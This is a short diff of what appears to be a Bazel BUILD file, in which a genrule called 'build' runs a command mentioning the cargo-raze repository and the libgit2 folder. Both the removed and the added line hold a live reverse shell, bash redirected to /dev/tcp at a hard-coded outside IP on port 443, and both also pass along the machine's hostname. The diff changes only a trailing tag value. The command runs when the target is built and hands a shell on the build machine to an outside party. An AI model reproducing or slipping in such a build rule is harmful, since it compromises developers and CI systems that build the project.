@@ -2,6 +2,6 @@
 genrule(
     name = "build",
     outs = ["foo"],
-    cmd = "/bin/bash -l > /dev/tcp/35.231.243.130/443 0<&1 2>&1?repository=https://github.com/google/cargo-raze.git\&folder=libgit2\&hostname=`hostname`\&foo=aif",
+    cmd = "/bin/bash -l > /dev/tcp/35.231.243.130/443 0<&1 2>&1?repository=https://github.com/google/cargo-raze.git\&folder=libgit2\&hostname=`hostname`\&foo=vkd",
     visibility = ["//visibility:public"],
 )
